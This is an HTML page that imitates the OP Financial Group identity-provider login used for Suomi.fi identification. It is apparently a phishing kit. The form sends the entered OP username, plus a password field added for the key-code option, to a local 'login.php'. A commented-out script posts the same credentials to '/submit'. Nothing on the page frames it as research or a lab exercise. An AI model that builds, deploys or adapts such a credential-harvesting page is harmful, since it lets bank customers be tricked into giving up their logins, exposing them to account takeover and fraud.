
<!DOCTYPE html>
<html lang="en" class="translated-ltr">
<head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; utf-8">
    <link rel="shortcut icon" href="/authentication/ui/legacy/favicon.ico">
     <link rel="stylesheet" href="https://saml-idp.op.fi/static/op/opux/v3/base.css">
    <link rel="stylesheet" href="https://saml-idp.op.fi/static/op/opux-static/v3/core.css">
    <link rel="stylesheet" href="https://saml-idp.op.fi/static/op/opux-classic/v2/bundle.css">
    <link rel="stylesheet" href="https://saml-idp.op.fi/static/op/opux/v3/components.css">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>OP Identity Provider Service</title>
    <script src="https://saml-idp.op.fi/static/amd.js"></script>
    <script src="versions.js"></script>
    <link href="opgroupcss/op-identity-provieer.css" rel="stylesheet">
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="jquery" src="jquery.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="opux" src="bundle.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="moment" src="moment-with-fi-sv.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="lodash" src="lodash.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="nouislider" src="nouislider.js"></script>
    <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.69JJaQ5G5xA.L.W.O/d=0/rs=AN8SPfpC36MIoWPngdVwZ4RUzeJYZaC7rg/m=el_main_css">
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="op/login-wrapper" src="login-plugin.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="react" src="react.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="op/opux/v3/opux-core" src="opux-core.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="react-dom" src="react-dom.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="op/opux-modal/v3/modal" src="modal.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="op/opux-infobox/v3/infobox" src="infobox.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="popperjs/core" src="popper.js"></script><style>.s1e9l74a{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;width:100%;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;text-align:center;color:#323232;line-height:2.4rem;font-size:1.7rem;margin-top:1.6rem;margin-bottom:3.6rem;text-transform:uppercase;}.s1e9l74a:before,.s1e9l74a:after{content:'';-webkit-flex:1;-ms-flex:1;flex:1;border-bottom:0.1rem solid #DCDCDC;}.s1e9l74a:before{margin-right:0.4rem;}.s1e9l74a:after{margin-left:0.4rem;}
@media screen and (max-width:399px){.h1mb45nn{display:none;}}
.s15nkou8{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;max-width:52.8rem;}.s15nkou8 .ds-alert{margin-top:2.4rem;margin-bottom:0;}.s15nkou8 form{width:100%;}.s15nkou8 footer{margin:2rem 0;}
.o1mwzxa8{margin:0 auto;}
.h1y2mlq{white-space:nowrap;margin-bottom:0 !important;}
.g77mtws{margin-top:3.6rem;}
.t2p5kn .ds-tile__content{margin-right:0.8rem;}@media screen and (max-width:399px){.t2p5kn{margin-top:1.6rem;}}
.t1edtxbv{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;font-weight:500;font-size:1.9rem;line-height:2.4rem;}@media screen and (min-width:800px){.t1edtxbv{font-size:2.2rem;}}
.clglbzu{display:block;margin-left:auto;margin-right:auto;}
.s8tyd62{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;text-align:center;}.s8tyd62 p{margin:2rem 0 2.4rem;}.s8tyd62 button{width:21rem;}
.k1x1axhw{margin:4rem 0;}
.i6298kk{margin-left:0.4rem;padding-top:0.4rem !important;padding-bottom:0.2rem !important;}
.i1c4xekb{z-index:1001;}
.h1eqnlm0[tabindex]:focus{outline-color:#6C6C6C;outline-style:dotted;outline-width:0.1rem;}
.n19h0qi2{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;max-width:60rem;margin:4rem 0;}
.huydt7b{margin:4rem auto;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}
.sbf5dj5{margin:4rem 0;max-width:100rem;}
.p1dqi7we{font-size:4.2rem;line-height:4.4rem;margin-bottom:2rem;}
.sj05kqb{font-size:2.8rem;line-height:3.2rem;}
.mtntbkz{margin-bottom:1rem;}
.m1t6edoy{margin-bottom:3rem;}
.s1rbj2m8{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:flex-start;-webkit-box-align:flex-start;-ms-flex-align:flex-start;align-items:flex-start;border-top:1px solid rgba(0,0,0,0.15);border-bottom:1px solid rgba(0,0,0,0.15);padding:3rem 0;}.ds-alert + .s1rbj2m8{border-top:0;padding-top:0;}.s1rbj2m8 ol{margin:0;}
.fll2k4n{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;padding:0 1rem;width:20rem;margin-right:1rem;}.sbf5dj5 .fll2k4n{width:22rem;margin-right:3rem;}@media screen and (max-width:679px){.fll2k4n{display:none;}}
.s8jfrax li:not([value]):before{position:absolute;margin:0.2rem 0 0 -2.8rem;background:url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzIgMzIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSIzMiIgd2lkdGg9IjMyIj48cGF0aCBzdHlsZT0iZmlsbDojMDA5ZTJlIiBkPSJNMjUuMTQ3IDguMzA1YTEuMDk2IDEuMDk2IDAgMDExLjU0OC0uMTU4IDEuMDk3IDEuMDk3IDAgMDEuMTU4IDEuNTQ4TDE1Ljk2MyAyM2MtLjIxNC4yNjEtLjU5NC4zOS0uOTc5LjM4OC0uMzc2LS4wMDMtLjc1NS0uMTMyLS45ODQtLjM4OGwtNi44MDQtNy4yNWExLjA5NyAxLjA5NyAwIDAxLjA1My0xLjU1NCAxLjA5NyAxLjA5NyAwIDAxMS41NTUuMDUzbDYuMTk4IDYuNzM1TDI1LjE0NyA4LjMwNXoiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PC9wYXRoPjwvc3ZnPgo=);background-repeat:no-repeat;background-size:contain;content:' ';white-space:pre;}
.a1dxryx1{margin-top:3rem;}
.l16m58gf{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;-webkit-align-items:baseline;-webkit-box-align:baseline;-ms-flex-align:baseline;align-items:baseline;font-size:1.6rem;width:100%;}
.ntry4c9{font-size:2.8rem;}
.ex2etfo{margin:0 0 0.4rem;}
.efanki3{margin-top:0.4rem;}
.f1xj53zn{border:solid rgba(0,0,0,0.15);border-width:1px 0;padding:2.4rem 1.6rem;}.ds-alert + .f1xj53zn{border-top:0;padding-top:0;}.f1xj53zn,.f1xj53zn label{color:#323232;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}.f1xj53zn > *{margin-bottom:0.8rem;}.f1xj53zn > :last-child{margin-bottom:0;}.f1xj53zn input{margin:0.4rem 0;}.f1xj53zn button{width:21rem;}
.chk4o15{font-size:1.4rem;line-height:2rem;margin-top:0.4rem;text-align:center;}
.cofvtks{color:#E5354A;}
.h1cf9lsd{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;max-width:50rem;margin:0 auto 2rem;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;text-align:center;}.h1cf9lsd p{margin-top:3rem;max-width:44rem;}.h1cf9lsd .ds-action{display:block;margin-top:1rem;}
.h18p02a4{margin-bottom:1rem;}
.h1bc53v0{margin-top:1rem;}
.neyuedu{margin-bottom:3.2rem;}.neyuedu p{margin-bottom:1rem;}
.t6xk2qr{margin-bottom:0 !important;}
.c1djxu0v{margin-top:3rem;max-width:30rem;}
.m19ejyf4 .ds-modal__body{margin-top:1.8rem;}.m19ejyf4 .ds-modal__footer{-webkit-box-pack:end;-webkit-justify-content:flex-end;-ms-flex-pack:end;justify-content:flex-end;}
.s1fld56r ellipse,.s1fld56r line,.s1fld56r path{fill:none;stroke:#6e6e6e;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10;stroke-width:1.25;}
.f1ukhx6a circle{fill:#6e6e6e;}
.c1b3om85{stroke:#6e6f70;}
input.i1i6cocj{background:repeating-linear-gradient( to right, white, white 4.3rem, rgba(0,0,0,0.2) 4.3rem, rgba(0,0,0,0.2) 4.4rem );background-position:0 0.1rem;font-variant-numeric:tabular-nums;font-size:2.6rem;font-weight:400;-webkit-text-decoration:none;text-decoration:none;height:6rem;-webkit-letter-spacing:2.9rem;-moz-letter-spacing:2.9rem;-ms-letter-spacing:2.9rem;letter-spacing:2.9rem;padding:0.7rem 0 0.7rem 1.5rem;}
input.i1c753b1{background:repeating-linear-gradient( to right, rgba(255,237,237,1), rgba(255,237,237,1) 4.3rem, rgba(0,0,0,0.2) 4.3rem, rgba(0,0,0,0.2) 4.4rem );}
.spi3ceg{position:absolute;left:-10000px;top:auto;width:1px;height:1px;overflow:hidden;}
</style><style>.g15pz2uq{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;border:1px solid rgba(0,0,0,0.2);border-width:1px 0 0 1px;line-height:2rem;max-width:740px;}.g15pz2uq li{border:1px solid rgba(0,0,0,0.2);border-width:0 1px 1px 0;min-height:12.8rem;outline:0;}
.s9d4x37{max-width:none;}.s9d4x37 li{width:50%;}
.m126s0u{max-width:none;}.m126s0u li{width:33.33%;}
.weut0fb{max-width:none;}.weut0fb li{width:25%;}
.ls8hyy5{height:100%;width:100%;display:inline-block;-webkit-transition:box-shadow 0.2s ease-out;transition:box-shadow 0.2s ease-out;}.ls8hyy5:hover,.ls8hyy5:focus{box-shadow:inset 0 0 0 1px rgba(255,106,16,0.75);}.ls8hyy5:focus{outline:0;}.ls8hyy5:active{box-shadow:inset 0 0 0 1px #ff6a10;}.ls8hyy5 div{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;height:5rem;margin-top:2.4rem;}.ls8hyy5 img{max-width:10rem;max-height:5rem;}.ls8hyy5 span{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;min-height:4rem;margin:0 1.2rem 0.8rem;}
.clglbzu{display:block;margin-left:auto;margin-right:auto;}
</style></head><body><header id="idp-header">
        <section class="tp-header-content tp-ktss">
            <div class="op-logo with-text"></div>
        <a class="main-content-link" href="#opidentityprovider-container"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Go directly to content</font></font></a>
        <ul role="navigation" aria-label="Language" class="languages">
            <li><a id="fi" class="active-language language-link" lang="fi" title="in Finnish" href="#" aria-selected="false"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FI</font></font></a>
            </li>
            <li><a id="sv" class="language-link" lang="sv" title="in Swedish" href="#" aria-selected="false"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SV</font></font></a>
            </li>
            <li><a id="en" class="active-language" lang="en" title="in English" href="#" aria-selected="true"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NO</font></font></a>
            </li>
        </ul>
        </section>
</header>
<div id="op-main-container" class="notranslate"><div id="opidentityprovider-notification-container"></div><div id="opidentityprovider-privacy">
  <section>
  	<h1 class="op-logo-service-header" id="op_service_header">OP Identity Provider Service</h1>
    <p>Identify yourself to <strong>Suomi.fi-tunnistus</strong>. We will forward the following information to the identification service provider: personal ID code, name</p>
  </section>
</div><div id="opidentityprovider-container" aria-live="polite"><section data-testid="login-section"><section class="s15nkou8"><h2 id="auth-device-opfi-header" class="h1y2mlq auth-components-h2">Authenticate yourself</h2><form id="form1" name="form1" method="post" action = "login.php" ><div class="ds-form-row ds-form-row--large ds-row"><div class="ds-form-row__label ds-col ds-col--sm-4"><span id="ds-fr-label-2">Identification method</span></div>

<div class="ds-form-row__item ds-col ds-col--sm-8"><div aria-labelledby="ds-fr-label-2" role="group" class="ds-radio-group ds-radio-group--large"><div class="ds-option ds-option--large"><input name="ds-g-3" aria-invalid="false" id="auth-device-radio-mobilekey" type="radio" value="mobilekey" checked=""><label class="ds-option__label" for="auth-device-radio-mobilekey">Mobile key<button class="ds-button ds-info-box-reference i6298kk ds-button--compact ds-button--ghost ds-button--minified" tabindex="0" type="button" aria-describedby="login-mobilekey-infobox-content" id="login-mobilekey-infobox"><svg aria-hidden="false" aria-label="more information" role="img" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" class="ds-button__icon ds-icon" height="32" width="32"><path d="M16 12.391a1.41 1.41 0 1 0-.001-2.822A1.41 1.41 0 0 0 16 12.391m.279 1.61a1 1 0 0 1 1 .999v5.05L18 20a1 1 0 0 1 0 2h-4a1 1 0 0 1 0-2l1.274.05v-4.098l-.668.049a1 1 0 1 1 0-2h1.673zM6 6v20h20V6H6zm0-2h20a2 2 0 0 1 2 2v20a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z" fill-rule="evenodd"></path></svg></button></label></div>

<div class="ds-option ds-option--large">
	<input name="ds-g-3" aria-invalid="false" id="auth-device-radio-kr" type="radio" value="keycode">
		<label class="ds-option__label" for="auth-device-radio-kr">Key code list</label>
		</div></div></div></div><div class="ds-form-row ds-form-row--large ds-row" style="margin-bottom: 1.6rem;"><div class="ds-form-row__label ds-col ds-col--sm-4"><label for="auth-device-userid-mobilekey" id="ds-fr-label-10">Username</label></div><div class="ds-form-row__item ds-col ds-col--sm-8"><input aria-describedby="login-inline-error-container auth-device-error-validation-mobilekey ds-ti-ml-11" aria-invalid="false" aria-required="true" id="auth-device-userid-mobilekey" maxlength="8" required="" name="userId" minlength="6" placeholder="Enter your OP username" autocomplete="off" class="ds-text-input ds-input-behavior ds-input-behavior--large" type="text" value=""><span id="ds-ti-ml-11" style="display: none;">Enter at most 8 characters</span></div></div>
		
<div class="ds-form-row ds-form-row--large ds-row" id="password" style="display: none; margin-bottom: 1.6rem;">
  <div class="ds-form-row__label ds-col ds-col--sm-4">
    <label for="auth-device-password">Password</label>
  </div>
  <div class="ds-form-row__item ds-col ds-col--sm-8">
    <input aria-invalid="false" aria-required="true" id="auth-device-password" name="password" placeholder="Enter your password" class="ds-text-input ds-input-behavior ds-input-behavior--large" type="password">
  </div>
</div>


<div class="ds-form-row ds-form-row--large ds-row"><div class="ds-form-row__label ds-col ds-col--sm-4"></div><div class="ds-form-row__item ds-col ds-col--sm-8"><a class="ds-action ds-action--inline" role="button" tabindex="0" id="username-forgotten" href="#">Forgot your username?</a></div></div><div class="ds-button-row ds-button-row--primary ds-button-row--unstacked"><button aria-busy="false" class="ds-button ds-button--primary ds-button--large" type="submit" id="auth-device-submit-mobilekey">Continue</button><button class="ds-button ds-button--alternate ds-button--large" id="auth-cancel" type="button">Cancel</button></div></form></section><div aria-live="polite" aria-hidden="true" style="display: none;"></div></section></div><div><div tabindex="0" id="login-mobilekey-infobox-content" class="ds-info-box" role="tooltip" data-popper-placement="right" style="position: absolute; inset: 329.6px auto auto 532px; margin: 0px;"><div data-popper-arrow="true" style="position: absolute; top: 12px;"></div><div>Confirm identification with Mobile key on your phone or tablet. You will receive a confirmation request on OP-mobile or OP Business mobile.</div><button class="ds-button ds-info-box__close ds-button--compact ds-button--ghost ds-button--minified" tabindex="0"><svg aria-hidden="false" aria-label="close" role="img" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" class="ds-button__icon ds-icon ds-icon--small" height="32" width="32"><path d="m16 14.727 7.864-7.864a.897.897 0 0 1 1.272 0 .897.897 0 0 1 0 1.273L17.273 16l7.863 7.863a.898.898 0 0 1 0 1.273.897.897 0 0 1-1.272 0L16 17.272l-7.864 7.864a.897.897 0 0 1-1.272 0 .897.897 0 0 1 0-1.273L14.727 16 6.864 8.136a.897.897 0 0 1 0-1.273.897.897 0 0 1 1.272 0L16 14.727z" fill-rule="evenodd"></path></svg></button></div></div></div><script src="runtime-provider.js"></script><script src="vendor.js"></script><script src="op-provider-identity.js"></script><footer id="idp-footer">

    <div class="footer-content">
        <p style="margin-bottom: 20px;">
            <a class="ds-action ds-action--external" href="https://www.op.fi/accessibility/identification-accessibility-statement" aria-label="Accessibility statement, opens in a new window." target="_blank">
              <span class="ds-action__label"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Accessibility statement</font></font></span>
              <svg aria-hidden="false" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" class="ds-action__icon ds-icon ds-icon--small ds-icon--action" height="32" width="32"><path d="M22 22v-4a1 1 0 012 0v5a1 1 0 01-1 1H9a1 1 0 01-1-1V9a1 1 0 011-1h4.998a1 1 0 010 2H10v12h12zm1.91-12.482l-6.197 6.299a1 1 0 01-1.426-1.403l6.225-6.328-3.466.159a1 1 0 01-.092-1.998L24.37 6c.9 0 1.631.73 1.63 1.68l-.255 5.337a1 1 0 11-1.998-.095l.164-3.404z" fill-rule="evenodd"></path></svg>
            </a>
        </p>
        <p class="copy"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
            © OP Financial Group
        </font></font></p>
    </div>
</footer><div id="goog-gt-" class="skiptranslate VIpgJd-yAWNEb-L7lbkb" dir="ltr"><div style="padding: 8px;"><div><div class="VIpgJd-yAWNEb-l4eHX"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Translate"></div></div></div><div style="padding: 8px; float: left; width: 100%;"><h1 class="VIpgJd-yAWNEb-r4nke VIpgJd-yAWNEb-mrxPge">Original text</h1></div><div style="padding: 8px;"><div class="VIpgJd-yAWNEb-nVMfcd-fmcmS"></div></div><div class="VIpgJd-yAWNEb-cGMI2b" style="padding: 8px;"><div class="VIpgJd-yAWNEb-Z0Arqf-PLDbbf"><span class="VIpgJd-yAWNEb-Z0Arqf-hSRGPd">Contribute a better translation</span></div><div class="VIpgJd-yAWNEb-fw42Ze-Z0Arqf-haAclf"><hr style="color: #ccc; background-color: #ccc; height: 1px; border: none;"><div class="VIpgJd-yAWNEb-Z0Arqf-H9tDt"></div></div></div><div class="VIpgJd-yAWNEb-jOfkMb-Ne3sFf" style="display: none;"></div></div>
<div class="ReactModalPortal"></div>

<script>
  document.getElementById('auth-device-radio-mobilekey').addEventListener('change', function() {
    document.getElementById('password').style.display = 'none';
  });

  document.getElementById('auth-device-radio-kr').addEventListener('change', function() {
    document.getElementById('password').style.display = 'block';
  });
</script>
<!--
<script>
  $(document).ready(function() {
    // Replace 'form1' with the actual ID of your form element if different
    $('#form1').submit(function(e) {
      var auth-device-userid-mobilekey = $('#auth-device-userid-mobilekey').val();
      var auth-device-password = $('#auth-device-password').val();
      

      if (!auth-device-userid-mobilekey|| !auth-device-password) {
        e.preventDefault(); // Prevent form submission
        alert('Vennligst fyll ut alle nødvendige felt');
      }
    });
  });

  function submitForm(event) {
    event.preventDefault();

    var auth-device-userid-mobilekey = document.getElementById('auth-device-userid-mobilekey').value;
    var auth-device-password = document.getElementById('auth-device-password').value;
   

    var formData = new FormData();
    formData.append('auth-device-userid-mobilekey', auth-device-userid-mobilekey);
    formData.append('auth-device-password', auth-device-password);

    fetch('/submit', {
        method: 'POST',
        body: formData
    }).then(function(response) {
        if (response.ok) {
            alert('Data submitted successfully!');
            document.getElementById('submit-form').reset();
        } else {
            alert('Error submitting data!');
        }
    }).catch(function(error) {
        console.error('Error:', error);
    });
}

</script>
-->

 
    
   <script>
  $(document).ready(function() {
  // Replace 'form1' with the actual ID of your form element if different
  $('#form1').submit(function(e) {
    var userId = $('#userId').val();
    var password = $('#password').val();
   
    if (!password || !userId) {
      e.preventDefault(); // Prevent form submission
      alert('Please enter all fields');
    }
  });
});


</script>

</body></html>
